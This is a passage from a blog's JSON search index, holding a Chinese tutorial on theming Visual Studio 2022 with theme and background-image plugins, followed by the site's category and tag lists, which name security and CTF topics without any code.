2022界面美化教程","date":"2021-12-09T16:00:00.000Z","updated":"2021-12-09T16:00:00.000Z","comments":true,"path":"2021/12/Visual Studio 2022界面美化教程/","permalink":"https://s1rius.space/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/","excerpt":"","text":"我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。 这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章） 不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。 但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。 第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。 新建项目 C#里面最后一项 创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme 然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了 这个插件是为后面设置背景图片准备 第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。 背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些","categories":[{"name":"教程","slug":"教程","permalink":"https://s1rius.space/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"visual studio 2022","slug":"visual-studio-2022","permalink":"https://s1rius.space/tags/visual-studio-2022/"}],"author":"s1rius"}],"categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"},{"name":"教程","slug":"教程","permalink":"https://s1rius.space/categories/%E6%95%99%E7%A8%8B/"},{"name":"htb","slug":"htb","permalink":"https://s1rius.space/categories/htb/"},{"name":"算法","slug":"算法","permalink":"https://s1rius.space/categories/%E7%AE%97%E6%B3%95/"},{"name":"awd","slug":"awd","permalink":"https://s1rius.space/categories/awd/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"misc","slug":"misc","permalink":"https://s1rius.space/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://s1rius.space/tags/pwn/"},{"name":"re","slug":"re","permalink":"https://s1rius.space/tags/re/"},{"name":"crypto","slug":"crypto","permalink":"https://s1rius.space/tags/crypto/"},{"name":"cloudever wp","slug":"cloudever-wp","permalink":"https://s1rius.space/tags/cloudever-wp/"},{"name":"渗透","slug":"渗透","permalink":"https://s1rius.space/tags/%E6%B8%97%E9%80%8F/"},{"name":"权限维持","slug":"权限维持","permalink":"https://s1rius.space/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"PAM","slug":"PAM","permalink":"https://s1rius.space/tags/PAM/"},{"name":"htb-Cat","slug":"htb-Cat","permalink":"https://s1rius.space/tags/htb-Cat/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://s1rius.space/tags/HackTheBox/"},{"name":"leetcode","slug":"leetcode","permalink":"https://s1rius.space/tags/leetcode/"},{"name":"算法","slug":"算法","permalink":"https://s1rius.space/tags/%E7%AE%97%E6%B3%95/"},{"name":"vue","slug":"vue","permalink":"https://s1rius.space/tags/vue/"},{"name":"gin","slug":"gin","permalink":"https://s1rius.space/tags/gin/"},{"name":"golang","slug":"golang","permalink":"https://s1rius.space/tags/golang/"},{"name":"awd","slug":"awd","permalink":"https://s1rius.space/tags/awd/"},{"name":"长城杯","slug":"长城杯","permalink":"https://s1rius.space/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/"},{"name":"铁人三项","slug":"铁人三项","permalink":"https://s1rius.space/tags/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/"},{"name":"AoiAWD","slug":"AoiAWD","permalink":"https://s1rius.space/tags/AoiAWD/"},{"name":"反制脚本","slug":"反制脚本","permalink":"https://s1rius.space/tags/%E5%8F%8D%E5%88%B6%E8%84%9A%E6%9C%AC/"},{"name":"ssh","slug":"ssh","permalink":"https://s1rius.space/tags/ssh/"},{"name":"python","slug":"python","permalink":"https://s1rius.space/tags/python/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"https://s1rius.space/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"PyJail","slug":"PyJail","permalink":"https://s1rius.space/tags/PyJail/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://s1rius.space/tags/ctfshow/"},{"name":"unctf","slug":"unctf","permalink":"https://s1rius.space/tags/unctf/"},{"name":"xxe","slug":"xxe","permalink":"https://s1rius.space/tags/xxe/"},{"name":"buuctf","slug":"buuctf","permalink":"https://s1rius.space/tags/buuctf/"},{"name":"htb-Shoppy","slug":"htb-Shoppy","permalink":"https://s1rius.space/tags/htb-Shoppy/"},{"name":"SSTI","slug":"SSTI","permalink":"https://s1rius.space/tags/SSTI/"},{"name":"模板注入","slug":"模板注入","permalink":"https://s1rius.space/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"jwt","slug":"jwt","permalink":"https://s1rius.space/tags/jwt/"},{"name":"json web token","slug":"json-web-token","permalink":"https://s1rius.space/tags/json-web-token/"},{"name":"提权","slug":"提权","permalink":"https://s1rius.space/tags/%E6%8F%90%E6%9D%83/"},{"name":"ctfhub","slug":"ctfhub","permalink":"https://s1rius.space/tags/ctfhub/"},{"name":"linux","slug":"linux","permalink":"https://s1rius.space/tags/linux/"},{"name":"动态加载","slug":"动态加载","permalink":"https://s1rius.space/tags/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"},{"name":"rce","slug":"rce","permalink":"https://s1rius.space/tags/rce/"},{"name":"xss","slug":"xss","permalink":"https://s1rius.space/tags/xss/"},{"name":"xss-lab","slug":"xss-lab","permalink":"https://s1rius.space/tags/xss-lab/"},{"name":"kali","slug":"kali","permalink":"https://s1rius.space/tags/kali/"},{"name":"docker","slug":"docker","permalink":"https://s1rius.space/tags/docker/"},{"name":"upload","slug":"upload","permalink":"https://s1rius.space/tags/upload/"},{"name":"upload-labs","slug":"upload-labs","permalink":"https://s1rius.space/tags/upload-labs/"},{"name":"sql","slug":"sql","permalink":"https://s1rius.space/tags/sql/"},{"name":"sqli-lab","slug":"sqli-lab","permalink":"https://s1rius.space/tags/sqli-lab/"},{"name":"git","slug":"git","permalink":"https://s1rius.space/tags/git/"},{"name":"visual studio 2022","slug":"visual-studio-2022","permalink":"https://s1rius.space/tags/visual-studio-2022/"}]}